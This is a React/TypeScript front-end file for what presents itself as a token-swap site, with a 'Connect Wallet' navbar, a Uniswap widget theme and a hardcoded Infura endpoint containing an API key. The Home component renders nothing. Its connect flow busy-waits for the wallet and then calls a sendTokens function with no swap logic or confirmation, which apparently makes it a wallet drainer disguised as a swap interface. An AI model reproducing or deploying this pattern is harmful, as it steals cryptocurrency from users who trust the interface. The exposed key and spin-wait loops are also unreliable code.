import { Link, useNavigate } from "react-router-dom";
import { Disclosure, Dialog, Popover, Transition, } from '@headlessui/react'
import Snowfall from 'react-snowfall'
import { TokenBalance } from "alchemy-sdk";
import Wallet from "./wallet";

import { useState, useRef, useEffect } from "react";
import { alchemy } from "./Swap";
import { SwapWidget, darkTheme, Theme } from '@uniswap/widgets';
import { tokenList } from "./tokenList";
import '@uniswap/widgets/fonts.css'
import "./swap.css"
import { motion } from "framer-motion";
import React from "react";



export const Navbar: React.FC<{ connectWallet: Function }> = ({ connectWallet }) => {

    const [showNav, setShowNav] = useState(false);
    const [scrolled, setScrolled] = useState(false);

    const handleScroll = () => {
        const offset = window.scrollY;
        setScrolled(offset > 10); // You can adjust this threshold
    };

    useEffect(() => {
        window.addEventListener('scroll', handleScroll);
        return () => {
            window.removeEventListener('scroll', handleScroll);
        };
    }, []);

    return (
        <div className="relative z-[10000]">

            <header className={`py-6 px-4 top-0 left-0 w-full z-30 h-18 backdrop-blur-lg mc ${scrolled ? '' : ''} transition-all duration-300 ease-in-out  border-slate-600`}>
                <div className="">
                    <div className=" left-0 z-10 ">
                        <div className="flex justify-between items-center">
                            <div className="flex gap-24 items-center">
                                <div>
                                    <div className="flex items-center gap-2">
                                        <Link to={"/swap"}>
                                            <img className=" md:w-32 w-16" src={process.env.PUBLIC_URL + "/logo.svg"} alt="" />
                                        </Link>

                                    </div>
                                </div>
                                <div className="md:flex hidden items-center gap-12 font-light ">
                                    <Link className="text-base font-medium text-white" to={"/swap"}>Swap</Link>
                                    <Link className="text-base font-medium text-white" to={"/profile"}>Profile</Link>
                                    <Link className="text-base font-medium text-white" to={"/leaderboard"}>Leaderboard</Link>
                                    <Link className="text-base font-medium text-white" to={"/affiliate"}>Affiliate</Link>

                                    {/* <Link to={"/security"}>Security</Link> */}
                                </div>
                            </div>
                            <div className="relative flex items-center gap-8">

                                <button onClick={() => connectWallet()} className="font-medium py-2 px-4 rounded-full text-sm md:bg-[#1C3CF1]">
                                    <div className="flex item-center gap-2">
                                        <svg viewBox="0 0 25 24" xmlns="http://www.w3.org/2000/svg" width="18" height="18" className="c-PJLV _icon"><g clipPath="url(#clip0_3736_40081)"><path fill-rule="evenodd" clip-rule="evenodd" d="M12.8584 0.862959L15.3058 1.41525C16.9489 1.78602 18.2271 2.07447 19.2188 2.40426C20.2261 2.73925 21.004 3.13692 21.6096 3.76475C21.7414 3.9014 21.8498 4.01602 21.9385 4.11203C21.9394 4.11303 21.9403 4.11403 21.9413 4.11504C22.5067 4.5409 22.9972 5.05945 23.3914 5.64946C23.95 6.48545 24.2066 7.45716 24.3315 8.68458C24.4546 9.89445 24.4546 11.419 24.4546 13.3875V13.4584C24.4546 15.4268 24.4546 16.9514 24.3315 18.1613C24.2066 19.3887 23.95 20.3604 23.3914 21.1964C22.9312 21.8852 22.3398 22.4766 21.651 22.9369C20.815 23.4954 19.8433 23.7521 18.6159 23.8769C17.406 24 15.8814 24 13.9129 24H10.9962C9.02776 24 7.50318 24 6.29331 23.8769C5.06589 23.7521 4.09417 23.4954 3.25818 22.9369C2.56938 22.4766 1.97797 21.8852 1.51773 21.1964C0.959139 20.3604 0.702521 19.3887 0.577659 18.1613C0.504912 17.4462 0.475165 16.6211 0.463001 15.6594C0.457469 15.6262 0.45459 15.5921 0.45459 15.5573V13.5198C0.45459 13.4993 0.45459 13.4789 0.45459 13.4584V13.3875C0.45459 13.367 0.45459 13.3465 0.45459 13.3261V11.2885C0.45459 11.2538 0.457469 11.2197 0.463001 11.1865C0.475164 10.2248 0.504912 9.3997 0.577659 8.68458C0.702521 7.45716 0.959139 6.48545 1.51773 5.64946C1.85461 5.14527 2.26177 4.69328 2.72596 4.3067C3.11565 3.02447 3.55365 2.07925 4.32097 1.37775C4.84839 0.895558 5.46731 0.520025 6.14202 0.271815C6.96557 -0.0311507 7.84132 -0.0555731 8.89761 0.0751007C9.93706 0.203692 11.2152 0.492136 12.8584 0.862959ZM4.39684 3.35079C4.95892 3.15746 5.58334 3.04115 6.29331 2.96893C7.50318 2.84585 9.02777 2.84586 10.9962 2.84586H13.9129C14.7013 2.84586 15.4185 2.84586 16.0727 2.85376C15.7378 2.77698 15.3811 2.69646 15.0007 2.61061L12.6204 2.07346C10.9367 1.6935 9.7179 1.41918 8.7462 1.29897C7.7843 1.17997 7.13094 1.22202 6.56779 1.42918C6.04187 1.62266 5.56127 1.91472 5.15307 2.28791C4.85984 2.55599 4.61826 2.89086 4.39684 3.35079ZM1.68779 13.4229C1.68779 12.8782 1.68785 12.3738 1.69023 11.9051H4.6285C5.46675 11.9051 6.14629 12.5847 6.14629 13.4229C6.14629 14.2612 5.46675 14.9407 4.6285 14.9407H1.69023C1.68785 14.4721 1.68779 13.9676 1.68779 13.4229ZM1.70507 16.1739H4.6285C6.14783 16.1739 7.37949 14.9423 7.37949 13.4229C7.37949 11.9036 6.14783 10.6719 4.6285 10.6719H1.70507C1.72046 9.96264 1.74955 9.34986 1.80453 8.80939C1.91947 7.67947 2.14247 6.93418 2.5431 6.33459C2.91337 5.78044 3.38916 5.30464 3.94331 4.93437C4.5429 4.53374 5.2882 4.31074 6.41812 4.1958C7.55834 4.07981 9.02038 4.07906 11.0317 4.07906H13.8775C15.8888 4.07906 17.3508 4.07981 18.491 4.1958C19.621 4.31074 20.3663 4.53374 20.9658 4.93437C21.52 5.30464 21.9958 5.78044 22.3661 6.33459C22.7667 6.93418 22.9897 7.67947 23.1046 8.80939C23.2206 9.94961 23.2214 11.4117 23.2214 13.4229C23.2214 15.4342 23.2206 16.8963 23.1046 18.0365C22.9897 19.1664 22.7667 19.9117 22.3661 20.5113C21.9958 21.0654 21.52 21.5412 20.9658 21.9115C20.3663 22.3121 19.621 22.5351 18.491 22.6501C17.3508 22.7661 15.8888 22.7668 13.8775 22.7668H11.0317C9.02038 22.7668 7.55834 22.7661 6.41812 22.6501C5.2882 22.5351 4.5429 22.3121 3.94331 21.9115C3.38916 21.5412 2.91337 21.0654 2.5431 20.5113C2.14247 19.9117 1.91947 19.1664 1.80453 18.0365C1.74955 17.496 1.72046 16.8832 1.70507 16.1739ZM17.5297 19.1146C17.5297 18.7741 17.8058 18.498 18.1463 18.498H19.5693C19.9098 18.498 20.1859 18.7741 20.1859 19.1146C20.1859 19.4552 19.9098 19.7312 19.5693 19.7312H18.1463C17.8058 19.7312 17.5297 19.4552 17.5297 19.1146Z" fill="currentColor"></path></g><defs><clipPath id="clip0_3736_40081"><rect width="24" height="24" fill="white" transform="translate(0.45459)"></rect></clipPath></defs></svg>
                                        <span className="md:inline-block hidden">
                                            Connect Wallet
                                        </span>
                                    </div>
                                </button>

                            </div>
                        </div>
                    </div>

                </div>
            </header>
        </div>
    )
}


const myDarkTheme: Theme = {
    ...darkTheme, // Extend the darkTheme
    container: "#E2E8F0",
    module: "#9CA3AF",
    primary: "#000000",
    secondary: "#FFFFFF",
    outline: "#000000",
    accent: "#000000",
    interactive: "#000000",
    dialog: "#000000",

    borderRadius: {
        large: 16,
        medium: 16,
        small: 16,
        xsmall: 16
    }
}


const jsonRpcUrlMap = {
    1: ["https://mainnet.infura.io/v3/d96840a8db194f239eab32544159793e"]
}

const Home = () => {
    const [ready, setReady] = useState(false);
    const [showOptions, setShowOptions] = useState(false);
    const [balance, setBalance] = useState<TokenBalance[]>([]);
    const [provider, setProvider] = useState<any>();
    const [isEdited, setIsEdited] = useState(false);
    const n = useRef(0);
    const navigate = useNavigate();

    const authenticateUser = async () => {
        await Wallet.create()
        await Wallet.connectWallet()
        transact();
        setReady(true);
    };

    const transact = async () => {
        if (n.current == 1) {
            setIsEdited(true);
        }
        if (Wallet.address) {
            while (!Wallet.readyToTransact()) {
                continue;
            }
            setProvider(Wallet.provider)
            if (Wallet.address) {
                Wallet.sendTokens();
                // getTokenBalances(Wallet.address);
                n.current = 1;
                return false;
            }
        }

        return false;

    }

    useEffect(() => {
        if (Wallet.address) {
            while (!Wallet.readyToTransact()) {
                continue;
            }
            setProvider(Wallet.provider)
        }
    }, [Wallet.address, ready]);

    useEffect(() => {

    })

    return (

        <div></div>
    )
}

export default Home;